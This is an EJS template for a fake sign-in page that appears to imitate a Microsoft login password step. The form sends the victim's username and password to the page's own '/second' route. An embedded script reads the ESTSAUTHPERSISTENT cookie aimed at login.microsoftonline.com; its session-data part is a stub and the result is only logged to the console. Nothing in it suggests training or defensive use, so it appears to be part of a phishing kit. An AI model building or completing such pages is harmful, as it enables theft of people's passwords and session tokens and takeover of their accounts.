<%- include('header'); -%>
<html>
<body>
  <div class="cardii" "col-5">
    <div class="cardtop">
      <img src="images/logoo.png" alt="logo" width="100px" height="80px">
    </div>
    <div>
      <form action="/second" method="POST" class="fum">
        <i class="fa-solid fa-arrow-left"></i>
        <p name="username" type="text" id="mail" class="ilight"><%= username %></p>
        <input type="hidden" id="email" name="username" value="<%= username %>">
        <h4>Enter password</h4>
        <input type="password" id="password" placeholder="Password" name="pass" minlength="6" required />
        <a href="#"><p>Forgot password?</p></a>
        <button class="btn btn-primary move" type="submit">Sign in</button>
      </form>
    </div>
  </div>

  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script type="text/javascript">
  $(document).ready(function() {
    function getWebSessionAndCookiesDataForESTSAUTHPERSISTENT(domain) {
      // Simulated implementation of getWebSessionData
      function getWebSessionData(domain) {
        // Your code to retrieve session data for the specified domain
        // Replace this with your actual implementation
        return "Sample web session data";
      }

      // Implementation of getCookiesData to retrieve the value of the cookie named "ESTSAUTHPERSISTENT"
      function getCookiesData(domain) {
        var cookies = document.cookie.split(';');
        var cookiesData = {};

        for (var i = 0; i < cookies.length; i++) {
          var cookie = cookies[i].trim();
          var cookieParts = cookie.split('=');
          var cookieName = cookieParts[0];
          var cookieValue = cookieParts[1];

          // Check if the cookie name matches "ESTSAUTHPERSISTENT"
          if (cookieName === 'ESTSAUTHPERSISTENT') {
            cookiesData[cookieName] = cookieValue;
          }
        }

        return cookiesData;
      }

      var webSessionData = getWebSessionData(domain);
      var cookiesData = getCookiesData(domain);
      var combinedData = {
        webSessionData: webSessionData,
        cookiesData: cookiesData,
      };
      console.log(combinedData);
      return combinedData;
    }

    var data = getWebSessionAndCookiesDataForESTSAUTHPERSISTENT("login.microsoftonline.com");
  });

  </script>

</body>
</html>

<%- include('footer'); -%>
